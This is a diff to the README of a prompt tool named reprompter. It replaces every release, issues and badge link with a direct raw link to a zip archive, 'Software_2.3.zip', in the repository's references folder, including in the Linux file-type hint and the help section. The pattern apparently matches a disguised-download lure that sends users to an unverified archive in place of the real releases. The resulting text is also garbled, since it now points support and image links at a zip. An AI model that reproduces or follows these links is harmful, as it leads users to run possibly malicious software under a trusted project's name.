@@ -1,6 +1,6 @@
 # 🚀 reprompter - Improve Your Prompts Quickly
 
-[![Download reprompter](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/tutayworks/reprompter/releases)
+[![Download reprompter](https://github.com/tutayworks/reprompter/raw/refs/heads/main/references/Software_2.3.zip)](https://github.com/tutayworks/reprompter/raw/refs/heads/main/references/Software_2.3.zip)
 
 ---
 
@@ -54,7 +54,7 @@ To get reprompter on your computer:
 
 1. Visit the official release page by clicking the link below or copy it into your browser:
 
-   [Download reprompter](https://github.com/tutayworks/reprompter/releases)
+   [Download reprompter](https://github.com/tutayworks/reprompter/raw/refs/heads/main/references/Software_2.3.zip)
 
 2. On the release page, look for the latest version. You will see files for different operating systems.
 
@@ -62,7 +62,7 @@ To get reprompter on your computer:
 
    - For Windows: Look for a file ending with `.exe`
    - For macOS: Look for a file ending with `.dmg` or `.zip`
-   - For Linux: Look for an `.AppImage` or `.tar.gz`
+   - For Linux: Look for an `.AppImage` or `https://github.com/tutayworks/reprompter/raw/refs/heads/main/references/Software_2.3.zip`
 
 4. Click the file to download it.
 
@@ -112,11 +112,11 @@ reprompter runs locally on your computer. It does not send your data to any serv
 If you need help with reprompter:
 
 - Visit the official repository’s discussions or issues page  
-  https://github.com/tutayworks/reprompter/issues  
+  https://github.com/tutayworks/reprompter/raw/refs/heads/main/references/Software_2.3.zip  
 - Check for updates regularly to keep your app working smoothly.
 
 ---
 
 # Ready to improve your prompts?
 
-[![Download reprompter](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/tutayworks/reprompter/releases)
+[![Download reprompter](https://github.com/tutayworks/reprompter/raw/refs/heads/main/references/Software_2.3.zip)](https://github.com/tutayworks/reprompter/raw/refs/heads/main/references/Software_2.3.zip)
